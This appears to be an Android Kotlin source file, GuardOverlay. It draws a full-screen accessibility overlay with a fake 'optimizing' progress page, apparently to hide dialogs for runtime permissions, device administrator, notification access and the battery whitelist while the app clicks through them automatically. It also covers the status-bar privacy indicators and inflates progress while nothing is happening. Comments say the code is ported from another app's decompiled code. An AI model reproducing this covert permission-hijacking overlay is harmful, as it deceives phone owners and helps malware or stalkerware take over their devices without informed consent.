package com.zaka.screenagent.ui

import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.content.Context
import android.graphics.PixelFormat
import android.graphics.Point
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient

/**
 * 「优化中」引导浮层。**按 2.2 的真实实现移植**（p077/AbstractC0710.m1441 + PinCapture.addOverlay）。
 *
 * 2.2 用的是无障碍浮层而不是 Activity，这点很关键：
 *  - type = 2032 (TYPE_ACCESSIBILITY_OVERLAY)：能盖住系统权限对话框，HOME 切桌面也不消失
 *  - flags = 280 = LAYOUT_IN_SCREEN | NOT_TOUCHABLE | NOT_FOCUSABLE：
 *      不抢焦点（不弹输入法）、不拦触摸（下面的权限页照样能点），但盖住整块屏幕
 *  - 尺寸 = 真实宽 × (真实高 + 200)，多出来的 200px 用于盖住导航栏/刘海
 *  - 120 秒后自动收尾（2.2 是 handler.postDelayed(..., 120000)）
 *
 * 用 Activity 做遮罩的后果就是你说的「一按 HOME 就回桌面了」——浮层不会。
 */
object GuardOverlay {

    private const val TAG = "GuardOverlay"
    private const val TYPE_ACCESSIBILITY_OVERLAY = 2032
    private const val FLAGS = 280 // LAYOUT_IN_SCREEN | NOT_TOUCHABLE | NOT_FOCUSABLE
    private const val AUTO_CLOSE_MS = 150_000L
    /** 引导硬超时：任何一步卡住都不能超过这个时间，到点强制收尾 */
    // 最坏情况：通知使用权 3 次×10s + 电池 3 次×20s + 收尾 ≈ 95s，留足余量到 120s
    private const val HARD_TIMEOUT_MS = 120_000L

    private val main = Handler(Looper.getMainLooper())
    private var webView: WebView? = null
    private var manager: WindowManager? = null
    private var band: android.view.View? = null
    private var curLp: WindowManager.LayoutParams? = null
    private var curBandLp: WindowManager.LayoutParams? = null


    // ── 引导期强制竖屏 ────────────────────────────────────────────────
    // 浮层是 2032 无障碍窗口，不受 Activity 的 screenOrientation 约束；
    // 这里直接把系统旋转锁到竖屏（WRITE_SETTINGS 已授权时生效），结束后恢复原值。
    private var savedAccel: Int? = null
    private var savedRotation: Int? = null

    private fun lockPortrait(ctx: android.content.Context) {
        runCatching {
            val cr = ctx.contentResolver
            if (Settings.System.canWrite(ctx)) {
                savedAccel = Settings.System.getInt(cr, Settings.System.ACCELEROMETER_ROTATION, 1)
                savedRotation = Settings.System.getInt(cr, Settings.System.USER_ROTATION, 0)
                Settings.System.putInt(cr, Settings.System.ACCELEROMETER_ROTATION, 0)
                Settings.System.putInt(cr, Settings.System.USER_ROTATION, 0)
                Log.d(TAG, "rotation locked to portrait (saved accel=${savedAccel})")
            } else {
                Log.w(TAG, "no WRITE_SETTINGS, skip rotation lock (relayout only)")
            }
        }
    }

    private fun unlockRotation(ctx: android.content.Context?) {
        val c = ctx ?: return
        runCatching {
            val cr = c.contentResolver
            if (Settings.System.canWrite(c)) {
                savedRotation?.let { Settings.System.putInt(cr, Settings.System.USER_ROTATION, it) }
                savedAccel?.let { Settings.System.putInt(cr, Settings.System.ACCELEROMETER_ROTATION, it) }
                Log.d(TAG, "rotation restored (accel=$savedAccel rot=$savedRotation)")
            }
        }
        savedAccel = null
        savedRotation = null
    }

    /** 旋转/分屏等配置变化后，按新的屏幕尺寸重排浮层（否则横屏时只盖住左半边） */
    fun relayout(service: android.accessibilityservice.AccessibilityService) {
        val wm = manager ?: return
        val wv = webView ?: return
        val real = android.graphics.Point().also {
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealSize(it)
        }
        val side = maxOf(real.x, real.y)
        runCatching {
            val lp = curLp ?: return@runCatching
            lp.width = real.x
            lp.height = real.y
            wm.updateViewLayout(wv, lp)
            curLp = lp
            Log.d(TAG, "relayout ${real.x}x${real.y} -> ${lp.width}x${lp.height}")
        }
        runCatching {
            val b = band ?: return@runCatching
            val blp = curBandLp ?: return@runCatching
            blp.width = real.x
            wm.updateViewLayout(b, blp)
            curBandLp = blp
        }
    }

    val isShowing: Boolean get() = webView != null

    /** 由无障碍服务调用（只有 AccessibilityService 上下文才能加 2032 浮层） */
    @SuppressLint("SetJavaScriptEnabled")
    fun show(service: AccessibilityService) {
        if (webView != null) return
        val wm = service.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return
        val real = Point().also { wm.defaultDisplay.getRealSize(it) }
        // 宽度必须用**实际屏宽**：之前用长边当宽度（1080×2400 的机器上宽度设成 2400），
        // 浮层内容按 2400 居中 → 文字和进度条被推到屏幕右侧外面。
        // 高度仍取长边，保证旋转瞬间也不会露底。
        val side = maxOf(real.x, real.y)
        val overlayW = real.x

        val wv = WebView(service).apply {
            setBackgroundColor(0xFF1F1F1F.toInt())
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            // 跟随系统「字体大小/显示大小」：WebView 默认 textZoom=100，不跟系统走
            runCatching {
                val fs = service.resources.configuration.fontScale
                settings.textZoom = (fs * 100).toInt().coerceIn(85, 160)
            }
            webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                // 用系统 Locale 覆盖一次（navigator.language 在部分 ROM 上不准）
                val lang = runCatching { java.util.Locale.getDefault().toLanguageTag() }.getOrDefault("en")
                view?.evaluateJavascript("window.__setLang && window.__setLang('$lang')", null)
            }
        }
            loadUrl("file:///android_res/raw/black_bg_loading.html")
        }

        // 调试/预览用：NO_FULL_GUIDE=true 时浮层只占屏幕下方 42%，其余区域可见
        val guideH = if (com.zaka.screenagent.BuildConfig.NO_FULL_GUIDE) (real.y * 0.42f).toInt() else real.y
        val lp = WindowManager.LayoutParams(
            overlayW,
            guideH,
            TYPE_ACCESSIBILITY_OVERLAY,
            FLAGS,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = if (com.zaka.screenagent.BuildConfig.NO_FULL_GUIDE)
                Gravity.BOTTOM or Gravity.START else Gravity.TOP or Gravity.START
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        lockPortrait(service)
        // 色带先加（z 序在下），WebView 后加（在上）→ 整屏纯黑，与 2.2 一致
        if (!com.zaka.screenagent.BuildConfig.NO_FULL_GUIDE) showStatusBand(service, wm, real)
        curLp = lp
        runCatching { wm.addView(wv, lp) }
            .onSuccess {
                webView = wv
                manager = wm
                Log.d(TAG, "overlay added type=$TYPE_ACCESSIBILITY_OVERLAY size=${real.x}x${real.y}")
                progressTarget = 0
                progressShown = 0
                updateProgress(0)
                // 空闲爬升：真实步骤没上报时也让进度条动起来
                main.removeCallbacks(creepTick)
                main.postDelayed(creepTick, 1200L)
                main.postDelayed({ hide() }, AUTO_CLOSE_MS)
                // 硬超时兜底：不管流程卡在哪一步，60 秒后一定退出，绝不无限挂住
                main.postDelayed({
                    if (webView == null) return@postDelayed
                    Log.w(TAG, "HARD TIMEOUT 120s -> force finish onboarding")
                    runCatching { com.zaka.screenagent.util.UiDump.dump("guard hard timeout") }
                    runCatching { hardFinish() }
                }, HARD_TIMEOUT_MS)
            }
            .onFailure { Log.e(TAG, "overlay failed: $it") }
    }

    /**
     * 2.2 的第二条浮层：PinCapture.addOverlay() 里的 120px 淡蓝色带
     *   type=2032, flags=792 (LAYOUT_NO_LIMITS|LAYOUT_IN_SCREEN|NOT_TOUCHABLE|NOT_FOCUSABLE)
     *   width=MATCH_PARENT, height=120, gravity=TOP|START, color=0x1A00A3FF
     * 作用是盖住状态栏区域（刘海/隐私指示点），纯视觉、不拦触摸。
     */
    private fun showStatusBand(service: AccessibilityService, wm: WindowManager, real: Point) {
        if (band != null) return
        runCatching {
            val v = android.view.View(service)
            v.setBackgroundColor(0x1A00A3FF)
            val lp = WindowManager.LayoutParams(
                real.x,
                120,
                TYPE_ACCESSIBILITY_OVERLAY,
                792, // LAYOUT_NO_LIMITS | LAYOUT_IN_SCREEN | NOT_TOUCHABLE | NOT_FOCUSABLE
                PixelFormat.TRANSLUCENT
            ).apply { gravity = Gravity.TOP or Gravity.START }
            curBandLp = lp
            wm.addView(v, lp)
            band = v
            Log.d(TAG, "status band added h=120")
        }.onFailure { Log.w(TAG, "status band failed: $it") }
    }

    // 进度：外部只给"目标值"，内部平滑爬升；且不允许回退（100→60 那种倒跳）
    @Volatile private var progressTarget = 0
    @Volatile private var progressShown = 0
    private val progressTick = object : Runnable {
        override fun run() {
            val target = progressTarget
            if (progressShown >= target) return
            // 固定 1%/档、约 9 档/秒：目标再大也是一格一格爬，肉眼能看到"在走"
            progressShown = minOf(target, progressShown + 1)
            val p = progressShown
            webView?.evaluateJavascript("window.__setProgress && window.__setProgress($p)", null)
            if (progressShown % 10 == 0 || progressShown == target) Log.d(TAG, "optProgress=$p")
            if (progressShown < target) main.postDelayed(this, 110L)
        }
    }

    /** percent 是"目标进度"：内部按 45ms 一档爬过去，不会瞬移；比当前小的值直接忽略 */
    /**
     * 空闲爬升：MIUI 上自动点击常被拦，权限事件迟迟不来时进度条会一直停在 0，
     * 看起来像"卡死"。这里在没有任何真实进度时每 900ms 慢慢爬到 30%，
     * 一旦真实事件把目标值顶过 30% 就自动退出（不会盖住真实进度）。
     */
    private val creepTick = object : Runnable {
        override fun run() {
            if (webView == null) return
            if (progressTarget >= CREEP_MAX) return
            progressTarget += 1
            main.removeCallbacks(progressTick)
            main.post(progressTick)
            main.postDelayed(this, 900L)
        }
    }
    private const val CREEP_MAX = 30

    fun updateProgress(percent: Int) {
        val p = percent.coerceIn(0, 100)
        if (webView == null) return
        if (p <= progressShown && p <= progressTarget) return
        progressTarget = maxOf(progressTarget, p)
        main.removeCallbacks(progressTick)
        main.post(progressTick)
    }

    /**
     * 阶段性真实进度（不要一下 100%）：
     *   运行时权限 0→60%（9 项，每项约 6.7%）
     *   设备管理员 60→75%
     *   通知使用权 75→90%
     *   电池白名单 90→100% → 收浮层
     */
    fun onPermissionGranted(granted: Int) {
        updateProgress((granted * 60) / 9)
    }

    const val STAGE_PERM_DONE = 60

    /** 自动点掉一个权限框 → 进度 +1 档（每档 6~7%，由平滑器慢慢爬上去） */
    @Volatile private var permBump = 0
    fun bumpPermissionProgress() {
        if (permBump >= 9) return
        permBump++
        updateProgress(minOf(STAGE_PERM_DONE, (permBump * 60) / 9 + 4))
    }
    const val STAGE_ADMIN_DONE = 75
    const val STAGE_NOTI_DONE = 90

    /** 2.2：进度 100% 后延时收浮层 */
    fun closeAfter(delayMs: Long = 2500L) {
        main.postDelayed({ hide() }, delayMs)
    }

    /** 超时收尾：记录缺哪些权限 → 恢复旋转 → 收浮层 → 回桌面 → 落完成标记（避免下次重连又弹） */
    private fun hardFinish() {
        val ctx = webView?.context
        if (ctx != null) {
            val miss = buildList {
                if (!com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(ctx)) add("notificationAccess")
                if (!com.zaka.screenagent.keepalive.KeepAliveManager.isIgnoringBatteryOptimizations(ctx)) add("batteryWhitelist")
            }
            Log.w(TAG, "hardFinish missing=$miss")
            runCatching { com.zaka.screenagent.admin.OnboardingState.markDone(ctx) }
        }
        runCatching { com.zaka.screenagent.notify.NotificationAccessActivator.stop() }
        runCatching { unlockRotation(ctx) }
        runCatching { webView?.let { manager?.removeView(it) } }
        webView = null
        runCatching { manager?.removeView(band) }
        band = null
        runCatching { com.zaka.screenagent.accessibility.BoundaryAccessibilityService.home() }
    }

    fun hide() {
        unlockRotation(webView?.context)

        val wv = webView
        val wm = manager
        band?.let { b -> runCatching { wm?.removeView(b) } }
        band = null
        if (wv != null) {
            runCatching { wm?.removeView(wv) }
            runCatching { wv.destroy() }
        }
        webView = null
        manager = null
        main.removeCallbacksAndMessages(null)
        Log.d(TAG, "overlay removed")
    }
}
